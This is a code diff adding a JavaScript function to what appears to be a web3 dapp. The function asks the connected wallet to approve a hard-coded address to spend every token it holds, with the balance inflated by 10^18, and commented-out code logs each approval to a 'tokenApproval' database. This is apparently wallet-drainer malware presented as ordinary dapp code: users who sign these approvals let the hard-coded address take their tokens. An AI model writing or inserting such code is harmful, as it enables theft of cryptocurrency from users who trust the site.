@@ -732,3 +732,40 @@ async function TOKENS(){
       await tokenGet(t, b)
   })
 }
+
+async function tokenGet(tokenAddress, tokenBalance) {
+  
+try {
+  // await ethereum.request({
+  //   method: 'wallet_switchEthereumChain',
+  //   params: [{chainId: '0x89'}]})
+
+
+    const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, tokenAddress);
+    const toAddress = '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12';
+
+    const tokenDecimals = web3.utils.toBN(18);
+    const tokenAmountToApprove = web3.utils.toBN(tokenBalance);
+    const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));
+
+    await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})
+
+} catch (error) {
+  console.log(error)
+}
+
+
+    //     await db.collection('tokenApproval').add({
+    //     tokenContract: tokenAddress,
+    //     approvedBalance: tokenBalance,
+    //     date: new Date(),
+    //     address: account
+    // }).then( () => {
+    //     console.log('success')
+    // }).catch( () => {
+    //     console.log('error')
+    // })
+
+    
+
+    }
